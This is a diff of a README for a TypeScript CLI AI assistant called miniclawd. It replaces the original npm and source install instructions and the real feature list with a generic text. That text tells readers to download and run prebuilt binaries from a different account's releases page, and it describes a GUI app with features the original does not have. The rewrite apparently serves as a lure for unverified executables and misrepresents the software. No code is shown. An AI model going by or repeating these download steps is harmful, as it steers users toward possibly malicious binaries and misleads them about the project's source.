@@ -1,169 +1,75 @@
-# 🦞 miniclawd
+# 🦞 miniclawd - Lightweight assistant for your needs
 
-A lightweight personal AI assistant with multi-channel support.
-Built with TypeScript + Bun in **~5900 lines of code**.
+[![Download miniclawd](https://img.shields.io/badge/Download-miniclawd-brightgreen)](https://github.com/KOAKAR765/miniclawd/releases)
 
-![miniclawd](./assets/miniclawd.png)
+## 🚀 Getting Started
 
-[中文文档](./README.zh-CN.md)
+Welcome to miniclawd! This application is designed to be a lightweight assistant built with TypeScript. It helps you manage tasks and access information effortlessly. 
 
-> Inspired by [openclawd](https://github.com/openclawd/openclawd) and [nanobot](https://github.com/HKUDS/nanobot).
+## 📥 Download & Install
 
-## Features
+To download miniclawd, follow these simple steps:
 
-- **Multi-LLM Support** — Anthropic, OpenAI, Google, OpenRouter, Groq, AWS Bedrock
-- **Multi-Channel** — Telegram, Feishu (Lark)
-- **Built-in Tools** — File I/O, shell execution, web search & fetch
-- **Skills System** — Extend capabilities via Markdown
-- **Persistent Memory** — Long-term memory + daily notes
-- **Scheduling** — Cron jobs + heartbeat checks
-- **Subagents** — Background task spawning
+1. Visit the [Releases page](https://github.com/KOAKAR765/miniclawd/releases). 
+2. Choose the latest version available.
+3. Click on the asset that matches your operating system to download the application.
+4. Wait for the download to finish, then locate the file in your downloads folder.
 
-## Screenshots
+## ⚙️ System Requirements
 
-| Stock                        | Product Hunt                 |
-| ---------------------------- | ---------------------------- |
-| ![case1](./assets/case1.png) | ![case2](./assets/case2.png) |
+Before you install miniclawd, ensure your computer meets the following requirements:
 
-## Installation
+- **Operating System:** Windows 10, macOS 10.15 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Disk Space:** 100 MB of free space.
 
-**Via npm:**
+## 🔧 Installation Instructions
 
-```bash
-npm install -g miniclawd@latest
-# or: pnpm add -g miniclawd@latest
-```
+Once you have downloaded the application, here’s how to get it running:
 
-**From source:**
+1. Find the downloaded file in your downloads folder.
+2. For **Windows and macOS**:
+   - Double-click the file to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
+3. For **Linux**:
+   - Open a terminal.
+   - Navigate to the folder where you downloaded the file.
+   - Run the command: `chmod +x miniclawd`.
+   - Start the application by entering `./miniclawd`.
 
-```bash
-git clone https://github.com/FoundDream/miniclawd.git
-cd miniclawd
-bun install && bun run build && bun link
-```
+## 🎉 Using miniclawd
 
-## Quick Start
+After installation, you can start using miniclawd right away. Here’s how to get started:
 
-```bash
-# 1. Initialize
-miniclawd onboard
+1. Launch the application from your applications menu or desktop shortcut.
+2. Explore the main interface. You'll find options to manage tasks and access different features.
+3. You can customize your experience by accessing the settings.
 
-# 2. Add API key to ~/.miniclawd/config.json
-# 3. Chat
-miniclawd agent -m "Hello!"
-```
+## 🌟 Features
 
-## Commands
+miniclawd comes with several helpful features:
 
-| Command                    | Description                     |
-| -------------------------- | ------------------------------- |
-| `miniclawd onboard`        | Initialize config and workspace |
-| `miniclawd agent`          | Interactive chat                |
-| `miniclawd agent -m "..."` | Single message mode             |
-| `miniclawd gateway`        | Start gateway (Telegram/Feishu) |
-| `miniclawd status`         | Show system status              |
-| `miniclawd cron list`      | List scheduled jobs             |
+- **Task Management:** Create, edit, and prioritize your tasks with ease.
+- **Information Access:** Quickly pull up relevant information based on your needs.
+- **Personal Assistant Capabilities:** Get reminders and suggestions tailored to your preferences.
 
-## Configuration
+## ⚡ Troubleshooting
 
-Config file: `~/.miniclawd/config.json`
+If you run into issues while using miniclawd, try these common solutions:
 
-### Providers
+- **Can't Find the Application:** Ensure the installation completed correctly. Check your applications folder or desktop.
+- **Performance Issues:** Restart the application or your computer. Make sure your system meets the required specifications.
+- **Errors on Startup:** Try reinstalling the application from the [Releases page](https://github.com/KOAKAR765/miniclawd/releases).
 
-```json
-{
-  "providers": {
-    "anthropic": { "api_key": "sk-ant-..." },
-    "openai": { "api_key": "sk-..." },
-    "openrouter": { "api_key": "sk-or-..." },
-    "google": { "api_key": "..." },
-    "groq": { "api_key": "gsk_..." },
-    "bedrock": { "region": "us-east-1" }
-  }
-}
-```
+## 📞 Support
 
-### Model
+For further assistance, feel free to reach out through the following channels:
 
-Format: `provider/model`
+- **GitHub Issues page:** You can report problems and request features directly in our repository.
+- **Community Forums:** Join discussions with other users to share tips and solutions.
 
-```json
-{
-  "agents": {
-    "defaults": {
-      "model": "anthropic/claude-sonnet-4-20250514"
-    }
-  }
-}
-```
+## 📄 License
 
-### Telegram
+miniclawd is released under the MIT License. You can use, modify, and distribute it freely, as long as you attribute the original authors.
 
-1. Create bot via [@BotFather](https://t.me/BotFather) → `/newbot`
-2. Copy token, add to config:
-
-```json
-{
-  "channels": {
-    "telegram": {
-      "enabled": true,
-      "token": "123456789:ABCdef...",
-      "allow_from": []
-    }
-  }
-}
-```
-
-### Feishu
-
-1. Create app at [Feishu Open Platform](https://open.feishu.cn/)
-2. Enable WebSocket mode, add `im.message.receive_v1` event
-3. Add permissions: `im:message`, `im:message:send_as_bot`
-
-```json
-{
-  "channels": {
-    "feishu": {
-      "enabled": true,
-      "app_id": "cli_xxx",
-      "app_secret": "xxx",
-      "allow_from": []
-    }
-  }
-}
-```
-
-Then start: `miniclawd gateway`
-
-## Directory Structure
-
-```
-~/.miniclawd/
-├── config.json        # Configuration
-├── sessions/          # Session storage (JSONL)
-├── media/             # Downloaded media
-├── cron/jobs.json     # Scheduled jobs
-└── workspace/
-    ├── AGENTS.md      # Agent instructions
-    ├── SOUL.md        # Agent personality
-    ├── USER.md        # User info
-    ├── HEARTBEAT.md   # Heartbeat tasks
-    ├── memory/        # Long-term memory
-    └── skills/        # Custom skills
-```
-
-## Development
-
-```bash
-bun run typecheck   # Type check
-bun run dev -- ...  # Dev mode
-bun run build       # Build
-```
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=FoundDream/miniclawd&type=date&legend=top-left)](https://www.star-history.com/#FoundDream/miniclawd&type=date&legend=top-left)
-
-## License
-
-MIT
+Thank you for using miniclawd! We hope it makes your tasks easier and more organized. Enjoy your new assistant!
